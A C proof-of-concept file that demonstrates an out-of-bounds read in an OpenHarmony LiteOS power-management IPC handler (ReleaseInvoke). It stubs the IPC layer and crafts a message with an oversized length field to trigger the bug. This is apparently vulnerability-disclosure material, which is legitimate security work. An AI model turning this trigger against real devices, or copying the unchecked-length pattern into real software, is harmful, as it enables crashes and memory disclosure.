/*
 * PoC: Buffer access with untrusted index/length without bounds validation
 * 
 * Vulnerability: In ReleaseInvoke() (power_manage_feature_impl.c:78),
 * the function reads a uint32_t `len` from the IPC request, then passes it
 * directly to ReadBuffer(req, len) without validating that `len` is within
 * acceptable bounds or that the buffer actually contains `len` bytes of valid
 * data. The returned pointer `data` is then cast to (RunningLockEntry*) and
 * passed to OnReleaseRunningLockEntry() without any NULL check or size
 * validation.
 *
 * CWE-125 / CWE-129: Out-of-bounds Read / Improper Validation of Array Index
 *
 * Call chain:
 *   FeatureInvoke(funcId=1) -> g_invokeFuncs[1] -> ReleaseInvoke()
 *     -> ReadUint32(req, &len)   // attacker controls len
 *     -> ReadBuffer(req, len)    // no bounds check on len vs actual IPC buffer
 *     -> OnReleaseRunningLockEntry(iProxy, data)  // uses potentially OOB data
 *
 * Trigger: An IPC client sends a crafted message with funcId=1 (RELEASE)
 * and a `len` value that exceeds the actual IPC buffer size, causing
 * ReadBuffer to return a pointer to out-of-bounds memory (or NULL which
 * is then dereferenced).
 *
 * Expected behavior: crash (SIGSEGV or heap-buffer-overflow) when the
 * code dereferences the invalid pointer returned by ReadBuffer, or when
 * OnReleaseRunningLockEntry accesses fields of the RunningLockEntry struct
 * beyond the actual buffer.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>

/* ========== Minimal type definitions to match OpenHarmony LiteOS IPC ========== */

#define EC_SUCCESS 0
#define EC_FAILURE (-1)
#define EC_INVALID (-2)
#define TRUE 1
#define FALSE 0
typedef int BOOL;

/* Simulated IpcIo structure - represents a serialized IPC message buffer */
typedef struct {
    uint8_t *bufStart;
    uint8_t *bufCur;
    uint8_t *bufEnd;
    uint32_t totalSize;
} IpcIo;

typedef void IServerProxy;
typedef void IUnknown;

/* Simulated RunningLockEntry - the struct that ReleaseInvoke expects */
typedef struct {
    uint32_t lockId;
    uint32_t lockType;
    uint32_t pid;
    uint32_t uid;
    char name[128];
} RunningLockEntry;

typedef enum {
    POWERMANAGE_FUNCID_ACQUIRE = 0,
    POWERMANAGE_FUNCID_RELEASE = 1,
    POWERMANAGE_FUNCID_ISANYHOLDING = 2,
    POWERMANAGE_FUNCID_SUSPEND = 3,
    POWERMANAGE_FUNCID_WAKEUP = 4,
    POWERMANAGE_FUNCID_BUTT
} PowerManageFuncId;

/* ========== Stub IPC read functions (simulating LiteOS IPC deserialization) ========== */

/* Reads a uint32 from the IPC buffer - simulates reading attacker-controlled length */
static void ReadUint32(IpcIo *req, uint32_t *val)
{
    if (req->bufCur + sizeof(uint32_t) <= req->bufEnd) {
        memcpy(val, req->bufCur, sizeof(uint32_t));
        req->bufCur += sizeof(uint32_t);
        printf("[PoC] ReadUint32: read value = %u\n", *val);
    } else {
        *val = 0;
        printf("[PoC] ReadUint32: buffer exhausted, returning 0\n");
    }
}

static void ReadInt32(IpcIo *req, int32_t *val)
{
    if (req->bufCur + sizeof(int32_t) <= req->bufEnd) {
        memcpy(val, req->bufCur, sizeof(int32_t));
        req->bufCur += sizeof(int32_t);
    } else {
        *val = 0;
    }
}

static void ReadBool(IpcIo *req, bool *val)
{
    if (req->bufCur + sizeof(uint8_t) <= req->bufEnd) {
        *val = (*req->bufCur != 0);
        req->bufCur += sizeof(uint8_t);
    } else {
        *val = false;
    }
}

/*
 * ReadBuffer: This is the critical function. In the real implementation,
 * it returns a pointer into the IPC buffer at the current offset.
 * 
 * VULNERABILITY: The caller (ReleaseInvoke) passes an attacker-controlled
 * `len` without bounds checking. If len > remaining buffer, this can:
 *   1. Return a pointer to memory beyond the buffer (OOB read)
 *   2. Return NULL (leading to NULL deref in caller)
 * 
 * We simulate the REAL behavior: advance the cursor by `len` even if it
 * goes past the end, returning a pointer into potentially invalid memory.
 */
static void *ReadBuffer(IpcIo *req, uint32_t len)
{
    void *ptr = (void *)req->bufCur;
    
    printf("[PoC] ReadBuffer: requested len=%u, remaining=%ld\n",
           len, (long)(req->bufEnd - req->bufCur));
    
    /* 
     * BUG SIMULATION: No bounds check on len vs remaining buffer.
     * The real LiteOS IPC ReadBuffer advances the cursor regardless,
     * returning a pointer that may be past the valid buffer region.
     */
    req->bufCur += len;
    
    if ((uint8_t*)ptr + len > req->bufEnd) {
        printf("[PoC] WARNING: ReadBuffer returned pointer to OOB memory!\n");
        printf("[PoC] Buffer end: %p, but data would extend to: %p\n",
               (void*)req->bufEnd, (void*)((uint8_t*)ptr + len));
    }
    
    return ptr;
}

static void WriteInt32(IpcIo *reply, int32_t val)
{
    /* stub - reply writing */
    (void)reply;
    (void)val;
}

static void WriteBool(IpcIo *reply, bool val)
{
    (void)reply;
    (void)val;
}

/* ========== Stub for downstream function ========== */

/*
 * OnReleaseRunningLockEntry: accesses fields of RunningLockEntry.
 * When data points to OOB memory, accessing these fields triggers the crash.
 */
static int32_t OnReleaseRunningLockEntry(IUnknown *iProxy, RunningLockEntry *entry)
{
    printf("[PoC] OnReleaseRunningLockEntry called with entry=%p\n", (void*)entry);
    
    if (entry == NULL) {
        printf("[PoC] NULL pointer dereference would occur here!\n");
        /* In real code, this would crash. Simulate: */
        printf("[PoC] VULNERABILITY TRIGGERED: NULL deref from unbounded ReadBuffer\n");
        abort();
    }
    
    /* TRIGGER: Accessing fields of the struct that may be in OOB memory */
    /* In a real scenario with ASAN, this would be detected as heap-buffer-overflow */
    printf("[PoC] Accessing entry->lockId at offset 0...\n");
    printf("[PoC] entry->lockId = %u\n", entry->lockId);
    printf("[PoC] Accessing entry->name at offset 16...\n");
    printf("[PoC] entry->name = %.16s\n", entry->name);
    
    printf("[PoC] VULNERABILITY TRIGGERED: accessed OOB struct fields successfully\n");
    return EC_SUCCESS;
}

/* ========== REAL vulnerable function (copied from source) ========== */

/*
 * This is the ACTUAL ReleaseInvoke implementation from
 * power_manage_feature_impl.c:78
 * 
 * The vulnerability: `len` is read from attacker-controlled IPC input,
 * then passed directly to ReadBuffer without any bounds validation.
 * There is no check that len == sizeof(RunningLockEntry) or that len
 * is within the IPC buffer's actual size.
 */
static int32_t ReleaseInvoke(IServerProxy *iProxy, void *origin, IpcIo *req, IpcIo *reply)
{
    uint32_t len = 0;
    ReadUint32(req, &len);
    /* VULNERABILITY: No bounds check on len before ReadBuffer call.
     * An attacker can set len to any value (e.g., 0xFFFFFFFF) causing
     * ReadBuffer to return a pointer to out-of-bounds memory. */
    void *data = (void*)ReadBuffer(req, len);
    /* TRIGGER: data may point to OOB memory or be semantically invalid.
     * It is cast to RunningLockEntry* and its fields are accessed. */
    int32_t ret = OnReleaseRunningLockEntry((IUnknown *)iProxy, (RunningLockEntry *)data);
    WriteInt32(reply, ret);
    return EC_SUCCESS;
}

/* ========== REAL FeatureInvoke (the public IPC dispatch entry point) ========== */

/* Function pointer table - the dispatch mechanism */
typedef int32_t (*InvokeFunc)(IServerProxy *iProxy, void *origin, IpcIo *req, IpcIo *reply);

/* We only need the RELEASE slot for this PoC */
static int32_t StubAcquireInvoke(IServerProxy *p, void *o, IpcIo *req, IpcIo *reply) {
    (void)p; (void)o; (void)req; (void)reply; return EC_SUCCESS;
}
static int32_t StubIsAnyHolding(IServerProxy *p, void *o, IpcIo *req, IpcIo *reply) {
    (void)p; (void)o; (void)req; (void)reply; return EC_SUCCESS;
}
static int32_t StubSuspend(IServerProxy *p, void *o, IpcIo *req, IpcIo *reply) {
    (void)p; (void)o; (void)req; (void)reply; return EC_SUCCESS;
}
static int32_t StubWakeup(IServerProxy *p, void *o, IpcIo *req, IpcIo *reply) {
    (void)p; (void)o; (void)req; (void)reply; return EC_SUCCESS;
}

static InvokeFunc g_invokeFuncs[POWERMANAGE_FUNCID_BUTT] = {
    StubAcquireInvoke,      /* ACQUIRE = 0 */
    ReleaseInvoke,          /* RELEASE = 1 -- the vulnerable function */
    StubIsAnyHolding,       /* ISANYHOLDING = 2 */
    StubSuspend,            /* SUSPEND = 3 */
    StubWakeup,             /* WAKEUP = 4 */
};

#define POWER_HILOGE(fmt, ...) printf("[ERROR] " fmt "\n", ##__VA_ARGS__)
#define POWER_HILOGD(fmt, ...) printf("[DEBUG] " fmt "\n", ##__VA_ARGS__)

/*
 * FeatureInvoke: The PUBLIC IPC entry point. This is called by the LiteOS
 * service framework when an IPC message arrives for the power management service.
 * It dispatches to the appropriate handler based on funcId.
 */
static int32_t FeatureInvoke(IServerProxy *iProxy, int32_t funcId, void *origin, IpcIo *req, IpcIo *reply)
{
    if ((iProxy == NULL) || (req == NULL)) {
        POWER_HILOGE("Invalid parameter");
        return EC_INVALID;
    }
    POWER_HILOGD("Power manage feature invoke function id: %d", funcId);
    return (funcId >= 0 && funcId < POWERMANAGE_FUNCID_BUTT) ? g_invokeFuncs[funcId](iProxy, origin, req, reply) :
        EC_FAILURE;
}

/* ========== PoC MAIN: Simulates a malicious IPC client ========== */

int main(void)
{
    printf("[PoC] === Buffer Access Without Bounds Validation in ReleaseInvoke ===\n");
    printf("[PoC] Simulating malicious IPC message to PowerManage service\n\n");

    /*
     * Craft a malicious IPC buffer.
     * 
     * Normal IPC message for RELEASE would contain:
     *   [uint32_t len = sizeof(RunningLockEntry)]  (4 bytes)
     *   [RunningLockEntry data]                    (sizeof(RunningLockEntry) bytes)
     *
     * Malicious message:
     *   [uint32_t len = 0xFFFF]  -- much larger than actual buffer
     *   [only 8 bytes of actual data]
     *
     * This causes ReadBuffer to return a pointer, but the actual valid
     * data is only 8 bytes. When OnReleaseRunningLockEntry accesses
     * fields at higher offsets (e.g., entry->name at offset 16),
     * it reads out-of-bounds memory.
     */
    
    /* Allocate a small IPC buffer - simulating a truncated/malicious message */
    #define MALICIOUS_BUF_SIZE 16  /* Only 16 bytes total: 4 for len + 12 of data */
    uint8_t ipc_buffer[MALICIOUS_BUF_SIZE];
    memset(ipc_buffer, 0x41, MALICIOUS_BUF_SIZE);  /* Fill with 'A' pattern */
    
    /* 
     * Write the malicious length value at the start of the buffer.
     * We claim the data is 0x1000 bytes, but the buffer only has 12 bytes after len.
     * This is the untrusted index/size that lacks bounds validation.
     */
    uint32_t malicious_len = 0x1000;  /* Claims 4096 bytes of data follow */
    memcpy(ipc_buffer, &malicious_len, sizeof(uint32_t));
    
    printf("[PoC] Crafted IPC buffer:\n");
    printf("[PoC]   - Claimed data length: %u (0x%x)\n", malicious_len, malicious_len);
    printf("[PoC]   - Actual buffer size: %d bytes\n", MALICIOUS_BUF_SIZE);
    printf("[PoC]   - Actual data after len field: %d bytes\n", 
           MALICIOUS_BUF_SIZE - (int)sizeof(uint32_t));
    printf("[PoC]   - Expected struct size: %zu bytes\n\n", sizeof(RunningLockEntry));

    /* Set up the IpcIo structure pointing to our small buffer */
    IpcIo req;
    req.bufStart = ipc_buffer;
    req.bufCur = ipc_buffer;
    req.bufEnd = ipc_buffer + MALICIOUS_BUF_SIZE;
    req.totalSize = MALICIOUS_BUF_SIZE;

    IpcIo reply;
    memset(&reply, 0, sizeof(reply));

    /* Fake IServerProxy - just needs to be non-NULL to pass the check */
    int fake_proxy = 1;

    printf("[PoC] Calling FeatureInvoke(funcId=POWERMANAGE_FUNCID_RELEASE=%d)\n",
           POWERMANAGE_FUNCID_RELEASE);
    printf("[PoC] This simulates an IPC client calling the power management service\n");
    printf("[PoC] with a RELEASE request containing a malicious length field.\n\n");

    /*
     * Call the PUBLIC API entry point: FeatureInvoke
     * funcId = 1 (RELEASE) will dispatch to ReleaseInvoke
     * 
     * The call chain is:
     *   FeatureInvoke -> g_invokeFuncs[1] -> ReleaseInvoke
     *     -> ReadUint32 reads len=0x1000 from attacker buffer
     *     -> ReadBuffer(req, 0x1000) returns OOB pointer (only 12 bytes available)
     *     -> OnReleaseRunningLockEntry dereferences OOB pointer as RunningLockEntry*
     */
    int32_t result = FeatureInvoke(
        (IServerProxy *)&fake_proxy,
        POWERMANAGE_FUNCID_RELEASE,  /* funcId = 1, dispatches to ReleaseInvoke */
        NULL,                         /* origin - not used in ReleaseInvoke */
        &req,
        &reply
    );

    printf("\n[PoC] FeatureInvoke returned: %d\n", result);
    printf("[PoC] If we reached here, OOB read occurred silently (no ASAN).\n");
    printf("[PoC] With AddressSanitizer, this would report heap-buffer-overflow.\n");
    
    return 0;
}